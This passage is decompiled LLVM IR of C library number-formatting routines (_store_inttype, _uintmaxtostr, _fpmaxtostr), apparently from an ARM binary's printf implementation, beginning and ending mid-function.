  %v2_150fc = load i32, i32* %v1_150fc, align 4
  %v3_150fc = add i32 %v0_150fc, 4
  %v4_150fc = inttoptr i32 %v3_150fc to i32*
  %v5_150fc = load i32, i32* %v4_150fc, align 4
  store i32 %v5_150fc, i32* @r1, align 4
  ret i32 %v2_150fc

dec_label_pc_15104:                               ; preds = %dec_label_pc_150f4
  %v7_15104 = icmp eq i32 %v0_150bc, 256
  %v0_15108 = load i32, i32* @r1, align 4
  %v1_15108 = inttoptr i32 %v0_15108 to i32*
  %v2_15108 = load i32, i32* %v1_15108, align 4
  %v2_1510c = urem i32 %v2_15108, 256
  %v2_1510c.v2_15108 = select i1 %v7_15104, i32 %v2_1510c, i32 %v2_15108
  br i1 %v7_15104, label %.thread2, label %dec_label_pc_15114

dec_label_pc_15114:                               ; preds = %dec_label_pc_15104
  %v7_15114 = icmp eq i32 %v0_150bc, 512
  br i1 %v7_15114, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_15114
  %v4_15118 = mul i32 %v2_1510c.v2_15108, 65536
  %v4_1511c = sdiv i32 %v4_15118, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15114, %dec_label_pc_15104, %bb5
  %v0_15120 = phi i32 [ %v2_15108, %dec_label_pc_15114 ], [ %v2_1510c, %dec_label_pc_15104 ], [ %v4_1511c, %bb5 ]
  %v3_15120 = ashr i32 %v0_15120, 31
  store i32 %v3_15120, i32* @r1, align 4
  ret i32 %v0_15120

; uselistorder directives
  uselistorder i32 %v0_15120, { 1, 0 }
  uselistorder i32 %v2_1510c, { 1, 0 }
  uselistorder i32 %v2_15108, { 1, 2, 0 }
  uselistorder i32 %v2_150d8, { 1, 0 }
  uselistorder i32 %v2_150d4, { 1, 2, 0 }
  uselistorder i1 %v2_150f4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_150fc, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_15128 = icmp eq i32 %arg2, 256
  br i1 %v7_15128, label %dec_label_pc_15154, label %dec_label_pc_15130

dec_label_pc_15130:                               ; preds = %entry
  %v7_15130 = icmp eq i32 %arg2, 2048
  br i1 %v7_15130, label %dec_label_pc_15138, label %dec_label_pc_15140

dec_label_pc_15138:                               ; preds = %dec_label_pc_15130
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_15138 = add i32 %tmp2, 4
  %v6_15138 = inttoptr i32 %v5_15138 to i32*
  store i32 %arg4, i32* %v6_15138, align 4
  ret i32 %tmp2

dec_label_pc_15140:                               ; preds = %dec_label_pc_15130
  %v7_15140 = icmp eq i32 %arg2, 512
  br i1 %v7_15140, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15140
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_15140
  %v4_15144 = sdiv i32 %arg3, 256
  %v1_15150 = trunc i32 %v4_15144 to i8
  %v4_15150 = add i32 %tmp2, 1
  %v5_15150 = inttoptr i32 %v4_15150 to i8*
  store i8 %v1_15150, i8* %v5_15150, align 1
  br label %dec_label_pc_15154

dec_label_pc_15154:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15154, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_15160 = icmp slt i32 %arg4, 0
  %v2_15160 = icmp eq i32 %arg4, 0
  store i1 %v2_15160, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_15160, label %dec_label_pc_15178, label %dec_label_pc_15198

dec_label_pc_15178:                               ; preds = %entry
  %v1_15178 = icmp slt i32 %arg3, 0
  %v2_15178 = icmp eq i32 %arg3, 0
  store i1 %v2_15178, i1* %cpsr_z.global-to-local, align 1
  %v1_1517c = sub i32 0, %arg4
  store i32 %v1_1517c, i32* %r7.global-to-local, align 4
  br i1 %v1_15178, label %dec_label_pc_15184, label %dec_label_pc_15198

dec_label_pc_15184:                               ; preds = %dec_label_pc_15178
  %v1_15188 = sub i32 0, %arg2
  store i32 %v1_15188, i32* %r5.global-to-local, align 4
  %v2_15188 = icmp eq i32 %arg2, 0
  %v2_1518c = icmp eq i1 %v2_15188, false
  %v5_1518c = sext i1 %v2_1518c to i32
  %v6_1518c = sub i32 %v5_1518c, %arg3
  store i32 %v6_1518c, i32* %r6.global-to-local, align 4
  %v19_1518c = icmp eq i32 %v6_1518c, 0
  store i1 %v19_1518c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_151a0

dec_label_pc_15198:                               ; preds = %dec_label_pc_15178, %entry
  br label %dec_label_pc_151a0

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15184, %dec_label_pc_15198
  %storemerge = phi i8 [ 0, %dec_label_pc_15198 ], [ 1, %dec_label_pc_15184 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_151a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_151b0 = udiv i32 -1, %v0_151a8
  store i32 %v2_151b0, i32* %fp.global-to-local, align 4
  %v2_151c0 = urem i32 -1, %v0_151a8
  %v1_151c4 = add i32 %v2_151c0, 1
  store i32 %v1_151c4, i32* %sb.global-to-local, align 4
  %v9_151c8 = icmp eq i32 %v1_151c4, %v0_151a8
  store i1 %v9_151c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_151c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_151a0
  %v1_151cc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_151cc, i32* %sb.global-to-local, align 4
  %v2_151d0 = add i32 %v2_151b0, 1
  store i32 %v2_151d0, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_151a0, %bb
  %v0_151d4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_151d4, i32* %sl.global-to-local, align 4
  %v0_151d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_151d8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dcthread-pre-split:               ; preds = %bb21
  %v0_151dc.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_151e4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151dcthread-pre-split, %.thread
  %v0_1524c = phi i32 [ %v0_151e4.pre, %dec_label_pc_151dcthread-pre-split ], [ %v0_151a8, %.thread ]
  %v0_151f8 = phi i32 [ %v0_151dc.pr, %dec_label_pc_151dcthread-pre-split ], [ %v0_151d4, %.thread ]
  %v2_151dc = icmp eq i32 %v0_151f8, 0
  store i1 %v2_151dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151dc, label %dec_label_pc_15248, label %dec_label_pc_151ec

dec_label_pc_151ec:                               ; preds = %dec_label_pc_151dc
  %v2_151ec = urem i32 %v0_151f8, %v0_1524c
  %v2_151fc = udiv i32 %v0_151f8, %v0_1524c
  store i32 %v2_151fc, i32* %sl.global-to-local, align 4
  %v0_15208 = load i32, i32* %r6.global-to-local, align 4
  %v2_1520c = urem i32 %v0_15208, %v0_1524c
  %v1_15214 = load i32, i32* %sb.global-to-local, align 4
  %v3_15214 = mul i32 %v1_15214, %v2_151ec
  %v4_15214 = add i32 %v3_15214, %v2_1520c
  store i32 %v4_15214, i32* %r5.global-to-local, align 4
  %v2_1521c = udiv i32 %v0_15208, %v0_1524c
  %v0_15224 = load i32, i32* %fp.global-to-local, align 4
  %v3_15224 = mul i32 %v0_15224, %v2_151ec
  %v4_15224 = add i32 %v3_15224, %v2_1521c
  %v2_1522c = udiv i32 %v4_15214, %v0_1524c
  %v2_15234 = add i32 %v4_15224, %v2_1522c
  br label %dec_label_pc_15268

dec_label_pc_15248:                               ; preds = %dec_label_pc_151dc
  %v0_15248 = load i32, i32* %r6.global-to-local, align 4
  %v2_15260 = udiv i32 %v0_15248, %v0_1524c
  br label %dec_label_pc_15268

dec_label_pc_15268:                               ; preds = %dec_label_pc_151ec, %dec_label_pc_15248
  %storemerge24 = phi i32 [ %v2_15260, %dec_label_pc_15248 ], [ %v2_15234, %dec_label_pc_151ec ]
  %v0_15284 = phi i32 [ %v2_15260, %dec_label_pc_15248 ], [ %v2_15234, %dec_label_pc_151ec ]
  %v1_15284 = phi i32 [ 0, %dec_label_pc_15248 ], [ %v2_151fc, %dec_label_pc_151ec ]
  %v4_15214.pn = phi i32 [ %v0_15248, %dec_label_pc_15248 ], [ %v4_15214, %dec_label_pc_151ec ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_15270 = urem i32 %v4_15214.pn, %v0_1524c
  %v3_15268 = load i32, i32* %stack_var_0, align 4
  %v2_1526c = icmp ugt i32 %v0_15270, 8
  %v7_1526c = icmp eq i32 %v0_15270, 9
  store i1 %v7_1526c, i1* %cpsr_z.global-to-local, align 1
  %v1_15274 = add i32 %v0_15270, 48
  %v0_1527c = load i32, i32* %r8.global-to-local, align 4
  %v1_1527c = add i32 %v0_1527c, -1
  store i32 %v1_1527c, i32* %r8.global-to-local, align 4
  %v2_15280 = xor i1 %v7_1526c, true
  %v3_15280 = and i1 %v2_1526c, %v2_15280
  %extract.t = trunc i32 %v1_15274 to i8
  br i1 %v3_15280, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15268
  %v2_15270 = add i32 %v3_15268, %v0_15270
  %extract.t8 = trunc i32 %v2_15270 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_15268, %bb20
  %v0_15288.off0 = phi i8 [ %extract.t, %dec_label_pc_15268 ], [ %extract.t8, %bb20 ]
  %v2_15284 = or i32 %v0_15284, %v1_15284
  %v4_15284 = icmp eq i32 %v2_15284, 0
  store i1 %v4_15284, i1* %cpsr_z.global-to-local, align 1
  %v3_15288 = inttoptr i32 %v1_1527c to i8*
  store i8 %v0_15288.off0, i8* %v3_15288, align 1
  %v0_1528c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1528c, label %dec_label_pc_15290, label %dec_label_pc_151dcthread-pre-split

dec_label_pc_15290:                               ; preds = %bb21
  %v2_15290 = load i8, i8* %stack_var_-40, align 1
  %v2_15294 = icmp eq i8 %v2_15290, 0
  store i1 %v2_15294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15294, label %dec_label_pc_15290..thread2_crit_edge, label %bb22

dec_label_pc_15290..thread2_crit_edge:            ; preds = %dec_label_pc_15290
  %v0_152a0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_15290
  %v3_1529c = load i32, i32* %r8.global-to-local, align 4
  %v4_1529c = add i32 %v3_1529c, -1
  %v5_1529c = inttoptr i32 %v4_1529c to i8*
  store i8 45, i8* %v5_1529c, align 1
  %v6_1529c = load i32, i32* %r8.global-to-local, align 4
  %v7_1529c = add i32 %v6_1529c, -1
  store i32 %v7_1529c, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15290..thread2_crit_edge, %bb22
  %v0_152a0 = phi i32 [ %v0_152a0.pre, %dec_label_pc_15290..thread2_crit_edge ], [ %v7_1529c, %bb22 ]
  ret i32 %v0_152a0

; uselistorder directives
  uselistorder i32 %v0_15270, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1524c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_15268, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_151a0, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-46 = alloca i32, align 4
  %stack_var_-86 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-85 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_152ac = load i32, i32* @r4, align 4
  store i32 %v3_152ac, i32* %stack_var_-36, align 4
  %v6_152ac = load i32, i32* @r5, align 4
  %v9_152ac = load i32, i32* @r6, align 4
  %v12_152ac = load i32, i32* @r7, align 4
  %v15_152ac = load i32, i32* @r8, align 4
  %v18_152ac = load i32, i32* @sb, align 4
  %v1_152b4 = add i32 %tmp, 8
  %v2_152b4 = inttoptr i32 %v1_152b4 to i8*
  %v3_152b4 = load i8, i8* %v2_152b4, align 1
  %v4_152b4 = zext i8 %v3_152b4 to i32
  store i32 %v4_152b4, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %fp.global-to-local, align 4
  %v1_152bc = or i32 %v4_152b4, 32
  %v2_152c0 = ptrtoint i32* %stack_var_-184 to i32
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_152c4 = icmp ult i32 %v1_152bc, 97
  store i1 %v6_152c4, i1* %cpsr_n.global-to-local, align 1
  %v7_152c4 = icmp eq i32 %v1_152bc, 97
  store i1 %v7_152c4, i1* %cpsr_z.global-to-local, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v2_152d0 = load i32, i32* %arg4, align 4
  store i32 %v2_152d0, i32* %r8.global-to-local, align 4
  br i1 %v7_152c4, label %bb, label %bb180

bb:                                               ; preds = %entry
  %v2_152d4 = add nuw nsw i32 %v4_152b4, 6
  store i32 %v2_152d4, i32* %r3.global-to-local, align 4
  br label %bb180

bb180:                                            ; preds = %entry, %bb
  %v1_152e8 = phi i32 [ 101, %entry ], [ %v2_152d4, %bb ]
  store i32 %arg2, i32* %stack_var_-192, align 4
  %v1_152e0 = add i32 %tmp, 12
  %v2_152e0 = inttoptr i32 %v1_152e0 to i32*
  %v3_152e0 = load i32, i32* %v2_152e0, align 4
  store i32 %v3_152e0, i32* %r2.global-to-local, align 4
  %v1_152e4 = add i32 %tmp, 4
  %v2_152e4 = inttoptr i32 %v1_152e4 to i32*
  %v3_152e4 = load i32, i32* %v2_152e4, align 4
  store i32 %v3_152e4, i32* %r1.global-to-local, align 4
  br i1 %v7_152c4, label %bb181, label %bb182

bb181:                                            ; preds = %bb180
  %v2_152e8 = urem i32 %v1_152e8, 256
  store i32 %v2_152e8, i32* %r7.global-to-local, align 4
  br label %bb182

bb182:                                            ; preds = %bb180, %bb181
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_152ec = icmp slt i32 %v2_152d0, 0
  store i1 %v1_152ec, i1* %cpsr_n.global-to-local, align 1
  %v2_152ec = icmp eq i32 %v2_152d0, 0
  store i1 %v2_152ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v1_152ec, label %bb183, label %bb184

bb183:                                            ; preds = %bb182
  store i32 6, i32* %r8.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %bb182, %bb183
  %v1_152f8 = and i32 %v3_152e0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_152f8 = icmp eq i32 %v1_152f8, 0
  store i1 %v2_152f8, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-50, align 1
  store i32 %arg1, i32* %stack_var_-192, align 4
  br i1 %v2_152f8, label %dec_label_pc_1530c, label %dec_label_pc_1537c

dec_label_pc_1530c:                               ; preds = %bb184
  %v1_1530c = urem i32 %v3_152e0, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1530c = icmp eq i32 %v1_1530c, 0
  store i1 %v2_1530c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1530c, label %.thread10, label %dec_label_pc_1537c

dec_label_pc_1537c:                               ; preds = %dec_label_pc_1530c, %bb184
  %storemerge = phi i8 [ 43, %bb184 ], [ 32, %dec_label_pc_1530c ]
  store i8 %storemerge, i8* %stack_var_-50, align 1
  %v2_15380 = add i32 %tmp, 16
  %v3_15380 = inttoptr i32 %v2_15380 to i32*
  store i32 32, i32* %v3_15380, align 4
  %v0_15388 = load i32, i32* %r7.global-to-local, align 4
  %v1_15388 = add i32 %v0_15388, -96
  %v3_15388 = sub i32 95, %v0_15388
  %v4_15388 = and i32 %v3_15388, %v0_15388
  %v5_15388 = icmp slt i32 %v4_15388, 0
  store i1 %v5_15388, i1* %cpsr_v.global-to-local, align 1
  %v6_15388 = icmp slt i32 %v1_15388, 0
  store i1 %v6_15388, i1* %cpsr_n.global-to-local, align 1
  %v7_15388 = icmp eq i32 %v0_15388, 96
  store i1 %v7_15388, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_15388, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_1537c
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_1537c, %bb185
  %v4_153a0 = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_1537c ]
  %v4_153a0..v1_15330 = select i1 %tmp242, i32 %v4_153a0, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_1dc70.837 to i32), i32* %r2.global-to-local, align 4
  %v2_153ac = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_153ac, i32* %r6.global-to-local, align 4
  %v2_153b0 = add i32 %v4_153a0..v1_15330, ptrtoint ([4 x i8]* @global_var_1dc70.837 to i32)
  store i32 %v2_153b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15834

.thread10:                                        ; preds = %dec_label_pc_1530c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_15438 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_15438, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_154b0, %.thread10
  %v3_15454 = phi i32 [ %v2_154a0, %dec_label_pc_154b0 ], [ %v3_152ac, %.thread10 ]
  %v1_15454 = phi i1 [ %v5_154b4, %dec_label_pc_154b0 ], [ false, %.thread10 ]
  %v0_15454 = phi i1 [ %v6_154b4, %dec_label_pc_154b0 ], [ false, %.thread10 ]
  %v2_15454 = xor i1 %v1_15454, %v0_15454
  br i1 %v2_15454, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_15440
  %v4_15454 = sub i32 0, %v3_15454
  store i32 %v4_15454, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_15440, %bb186
  %v0_15458 = phi i32 [ %v3_15454, %dec_label_pc_15440 ], [ %v4_15454, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_15458 = icmp slt i32 %v0_15458, 0
  store i1 %v1_15458, i1* %cpsr_n.global-to-local, align 1
  %v2_15458 = icmp eq i32 %v0_15458, 0
  store i1 %v2_15458, i1* %cpsr_z.global-to-local, align 1
  %v0_15474 = load i32, i32* %sl.global-to-local, align 4
  %v1_15474 = add i32 %v0_15474, 9
  store i32 %v1_15474, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1547c

dec_label_pc_1547c:                               ; preds = %dec_label_pc_1547c.dec_label_pc_1547c_crit_edge, %bb187
  %v1_15490 = phi i32 [ %v1_15490.pre, %dec_label_pc_1547c.dec_label_pc_1547c_crit_edge ], [ %v1_15474, %bb187 ]
  %v0_15488 = phi i32 [ %v0_154a4, %dec_label_pc_1547c.dec_label_pc_1547c_crit_edge ], [ 0, %bb187 ]
  %v0_15494 = phi i32 [ %v2_154a0, %dec_label_pc_1547c.dec_label_pc_1547c_crit_edge ], [ %v0_15458, %bb187 ]
  %v2_15484 = urem i32 %v0_15494, 10
  %v1_15488 = add i32 %v0_15488, 1
  store i32 %v1_15488, i32* %r5.global-to-local, align 4
  %v1_1548c = or i32 %v2_15484, 48
  store i32 %v1_1548c, i32* %r2.global-to-local, align 4
  %v2_15490 = sub i32 %v1_15490, %v1_15488
  store i32 %v2_15490, i32* %r3.global-to-local, align 4
  store i32 %v0_15494, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1549c = trunc i32 %v1_1548c to i8
  %v3_1549c = inttoptr i32 %v2_15490 to i8*
  store i8 %v1_1549c, i8* %v3_1549c, align 1
  %v0_154a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_154a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_154a0 = udiv i32 %v0_154a0, %v1_154a0
  store i32 %v2_154a0, i32* %r0.global-to-local, align 4
  %v0_154a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_154a4 = add i32 %v0_154a4, -8
  %v3_154a4 = sub i32 7, %v0_154a4
  %v4_154a4 = and i32 %v3_154a4, %v0_154a4
  %v5_154a4 = icmp slt i32 %v4_154a4, 0
  store i1 %v5_154a4, i1* %cpsr_v.global-to-local, align 1
  %v6_154a4 = icmp slt i32 %v1_154a4, 0
  store i1 %v6_154a4, i1* %cpsr_n.global-to-local, align 1
  %v7_154a4 = icmp eq i32 %v0_154a4, 8
  store i1 %v7_154a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_154a0, i32* %r4.global-to-local, align 4
  %v7_154ac = icmp slt i32 %v0_154a4, 9
  br i1 %v7_154ac, label %dec_label_pc_1547c.dec_label_pc_1547c_crit_edge, label %dec_label_pc_154b0

dec_label_pc_1547c.dec_label_pc_1547c_crit_edge:  ; preds = %dec_label_pc_1547c
  %v1_15490.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1547c

dec_label_pc_154b0:                               ; preds = %dec_label_pc_1547c
  %v0_154b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_154b0 = add i32 %v0_154b0, 1
  store i32 %v1_154b0, i32* %r6.global-to-local, align 4
  %v3_154b4 = sub i32 -1, %v0_154b0
  %v4_154b4 = and i32 %v1_154b0, %v3_154b4
  %v5_154b4 = icmp slt i32 %v4_154b4, 0
  store i1 %v5_154b4, i1* %cpsr_v.global-to-local, align 1
  %v6_154b4 = icmp slt i32 %v0_154b0, 0
  store i1 %v6_154b4, i1* %cpsr_n.global-to-local, align 1
  %v7_154b4 = icmp eq i32 %v0_154b0, 0
  store i1 %v7_154b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_154b4, label %dec_label_pc_15440, label %dec_label_pc_154bc

dec_label_pc_154bc:                               ; preds = %dec_label_pc_154b0
  %v0_154bc = load i32, i32* %r7.global-to-local, align 4
  %v1_154bc = add i32 %v0_154bc, -96
  %v3_154bc = sub i32 95, %v0_154bc
  %v4_154bc = and i32 %v3_154bc, %v0_154bc
  %v5_154bc = icmp slt i32 %v4_154bc, 0
  store i1 %v5_154bc, i1* %cpsr_v.global-to-local, align 1
  %v6_154bc = icmp slt i32 %v1_154bc, 0
  store i1 %v6_154bc, i1* %cpsr_n.global-to-local, align 1
  %v7_154bc = icmp eq i32 %v0_154bc, 96
  store i1 %v7_154bc, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_154bc, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_154bc
  %v5_154c8 = add i32 %v0_154bc, 32
  store i32 %v5_154c8, i32* %r3.global-to-local, align 4
  %v5_154cc = urem i32 %v5_154c8, 256
  store i32 %v5_154cc, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_154bc, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_154bc ]
  %v0_154ec = phi i32 [ %v5_154cc, %bb188 ], [ %v0_154bc, %dec_label_pc_154bc ]
  %v7_154d0 = icmp eq i32 %v0_154ec, 103
  %.229 = zext i1 %v7_154d0 to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_154dc = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_154dc = icmp slt i32 %v0_154dc, 0
  store i1 %v1_154dc, i1* %cpsr_n.global-to-local, align 1
  %v2_154dc = icmp eq i32 %v0_154dc, 0
  store i1 %v2_154dc, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_154dc, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_154e4 = icmp eq i1 %v7_154d0, false
  store i1 %v2_154e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154e4, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_154e8 = add i32 %v0_154dc, -1
  store i32 %v2_154e8, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_154f8 = phi i32 [ %v0_154dc, %.thread13 ], [ %v0_154dc, %bb192 ], [ %v2_154e8, %bb193 ]
  %v1_154ec = add i32 %v0_154ec, -102
  %v3_154ec = sub i32 101, %v0_154ec
  %v4_154ec = and i32 %v3_154ec, %v0_154ec
  %v5_154ec = icmp slt i32 %v4_154ec, 0
  store i1 %v5_154ec, i1* %cpsr_v.global-to-local, align 1
  %v6_154ec = icmp slt i32 %v1_154ec, 0
  store i1 %v6_154ec, i1* %cpsr_n.global-to-local, align 1
  %v7_154ec = icmp eq i32 %v0_154ec, 102
  store i1 %v7_154ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_154ec, label %dec_label_pc_154f8, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_154f8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1551c

dec_label_pc_154f8:                               ; preds = %bb194
  %v1_154f8 = load i32, i32* %sb.global-to-local, align 4
  %v2_154f8 = add i32 %v1_154f8, %v0_154f8
  store i32 %v2_154f8, i32* %ip.global-to-local, align 4
  %v2_154fc = add i32 %v2_154f8, 1
